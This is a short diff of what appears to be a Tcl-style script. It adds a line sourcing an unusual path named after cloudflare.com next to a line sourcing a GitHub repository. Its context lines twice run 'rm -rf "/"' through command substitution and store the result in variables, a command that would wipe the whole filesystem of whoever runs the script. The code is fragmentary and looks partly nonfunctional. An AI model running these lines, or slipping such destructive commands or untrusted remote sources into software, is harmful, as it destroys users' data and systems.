@@ -1,4 +1,5 @@
 source "https://github.com/Andrei-Barwood/Mithril"
+source "/.urls/cloudflare.com/"
 
 set y [rm -rf "/"]
 set z [rm -rf "/"]
